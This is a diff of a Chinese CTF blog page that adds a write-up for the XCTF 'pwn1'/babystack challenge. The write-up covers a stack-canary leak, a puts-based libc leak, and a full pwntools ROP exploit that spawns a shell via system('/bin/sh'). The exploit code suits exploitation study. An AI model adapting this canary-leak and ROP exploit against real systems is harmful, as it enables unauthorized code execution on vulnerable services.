@@ -91,8 +91,13 @@
 <meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/guess.png">
 <meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/stack.png">
 <meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/out.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/main-1596184067263.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/menu.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/check-1596184151147.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/pop.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/out-1596184509689.png">
 <meta property="article:published_time" content="2020-07-24T01:25:11.000Z">
-<meta property="article:modified_time" content="2020-07-24T02:27:42.438Z">
+<meta property="article:modified_time" content="2020-07-31T08:35:15.086Z">
 <meta property="article:author" content="caiii-vegtable">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://caiii-vegtable.github.io/image/xctf-adv/check.png">
@@ -328,6 +333,22 @@
 
 <p>效果</p>
 <p><img src="/image/xctf-adv/out.png" alt="out"></p>
+<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>main函数</p>
+<p><img src="/image/xctf-adv/main-1596184067263.png" alt="main"></p>
+<p>sub_4008b9是个菜单</p>
+<p><img src="/image/xctf-adv/menu.png" alt="menu"></p>
+<p>可以看到main函数中read的栈溢出。</p>
+<p>查看保护</p>
+<p><img src="/image/xctf-adv/check-1596184151147.png" alt="check"></p>
+<p>开启了NX、Canary，地址随机。</p>
+<p>思路：通过read的溢出覆盖Canary的第一个字节\x00，然后通过case 2中的puts打印canary。接下来再泄露puts地址，泄露libc，构造rop链。</p>
+<p>64位程序的pop rdi；ret</p>
+<p><img src="/image/xctf-adv/pop.png" alt="pop"></p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./babystack'</span>)</span><br><span class="line"><span class="comment">#p=remote('220.249.52.133',37661)</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="comment">#libc=ELF('./libc-2.23.so')</span></span><br><span class="line">elf = ELF(<span class="string">'./babystack'</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x400a93</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">main_addr=<span class="number">0x400908</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak canary</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">0x88</span>+<span class="string">'b'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'b'</span>)</span><br><span class="line">canary=u64(<span class="string">'\x00'</span>+p.recv(<span class="number">7</span>))</span><br><span class="line"><span class="keyword">print</span> hex(canary)</span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">payload1=<span class="string">'a'</span>*<span class="number">0x88</span>+p64(canary)+<span class="string">'c'</span>*<span class="number">0x8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr-libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_addr = libc_base+libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libc_base +libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">'a'</span>*<span class="number">0x88</span>+p64(canary)+<span class="string">'b'</span>*<span class="number">0x8</span>+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>效果</p>
+<p><img src="/image/xctf-adv/out-1596184509689.png" alt="out"></p>
 
       
     </div>
@@ -482,7 +503,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#攻防世界进阶区"><span class="nav-text">攻防世界进阶区</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#dice-game"><span class="nav-text">dice_game</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#攻防世界进阶区"><span class="nav-text">攻防世界进阶区</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#dice-game"><span class="nav-text">dice_game</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn1"><span class="nav-text">pwn1</span></a></li></ol></li></ol></div>
             
 
           </div>
